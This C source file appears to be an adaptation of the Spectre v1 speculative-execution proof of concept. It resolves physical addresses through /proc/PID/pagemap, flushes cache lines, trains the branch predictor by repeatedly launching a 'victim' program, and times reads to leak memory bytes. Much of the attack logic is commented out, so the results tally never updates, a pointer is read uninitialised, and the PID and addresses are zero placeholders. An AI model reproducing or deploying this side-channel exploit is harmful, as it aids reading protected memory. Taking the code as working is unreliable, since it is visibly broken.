//
// Adapted by rios0rios0 on 08/03/19.
//

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h> /* open */
#include <stdint.h> /* uint64_t  */
#include <stdio.h> /* printf */
#include <stdlib.h> /* size_t */
#include <unistd.h> /* pread, sysconf */

#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */

#endif
/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */
typedef struct {
	uint64_t pfn : 54;
	unsigned int soft_dirty : 1;
	unsigned int file_page : 1;
	unsigned int swapped : 1;
	unsigned int present : 1;
} PagemapEntry;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr) {
	size_t nread;
	ssize_t ret;
	uint64_t data;
	uintptr_t vpn;
	vpn = vaddr / sysconf(_SC_PAGE_SIZE);
	nread = 0;
	while (nread < sizeof(data)) {
		ret = pread(pagemap_fd, &data, sizeof(data) - nread,
		            vpn * sizeof(data) + nread);
		nread += ret;
		if (ret <= 0) {
			return 1;
		}
	}
	entry->pfn = data & (((uint64_t) 1 << 54) - 1);
	entry->soft_dirty = (data >> 54) & 1;
	entry->file_page = (data >> 61) & 1;
	entry->swapped = (data >> 62) & 1;
	entry->present = (data >> 63) & 1;
	return 0;
}

/* Convert the given virtual address to physical using /proc/PID/pagemap.
 *
 * @param[out] paddr physical address
 * @param[in]  pid   process to convert for
 * @param[in]  vaddr virtual address to get entry for
 * @return           0 for success, 1 for failure
 */
int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr) {
	char pagemap_file[BUFSIZ];
	int pagemap_fd;
	snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t) pid);
	pagemap_fd = open(pagemap_file, O_RDONLY);
	if (pagemap_fd < 0) {
		return 1;
	}
	PagemapEntry entry;
	if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
		return 1;
	}
	close(pagemap_fd);
	*paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
	return 0;
}

mem_flush(const void *p, unsigned int allocation_size) {
	const size_t cache_line = 64;
	const char *cp = (const char *) p;
	size_t i = 0;
	for (i = 0; i < allocation_size; i += cache_line) {
		asm volatile("clflush (%0)\n\t"
		:
		: "r"(&cp[i])
		: "memory");
	}

	asm volatile("sfence\n\t"
	:
	:
	: "memory");
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--) {
		mem_flush((void *) malicious_x, 30);
		/* Flush array2[256*(0..255)] from cache */
		//for (i = 0; i < 256; i++)
		//_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % 16;
		for (j = 29; j >= 0; j--) {
			//_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			char buffer[50];
			snprintf(buffer, sizeof(buffer), "./victim %lu ", x);
			system(buffer);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			//addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk);            /* READ TIMER */
			junk = *addr;                       /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
			//if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % 16])
			//results[mix_i]++;  /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk;  /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t) j;
	score[0] = results[j];
	value[1] = (uint8_t) k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	pid_t pid;
	uintptr_t vaddr1, vaddr2, paddr1 = 0, paddr2 = 0;
	pid = 000;
	vaddr1 = 000;
	vaddr2 = 000;
	if (virt_to_phys_user(&paddr1, pid, vaddr1)) {
		fprintf(stderr, "error: virt_to_phys_user\n");
		return EXIT_FAILURE;
	}
	if (virt_to_phys_user(&paddr2, pid, vaddr2)) {
		fprintf(stderr, "error: virt_to_phys_user\n");
		return EXIT_FAILURE;
	}
	//
	size_t malicious_x = (size_t) paddr1 - (size_t) paddr2;
	int score[2], len = 40;
	uint8_t value[2];
	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void *) malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d    ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}
	return (0);
}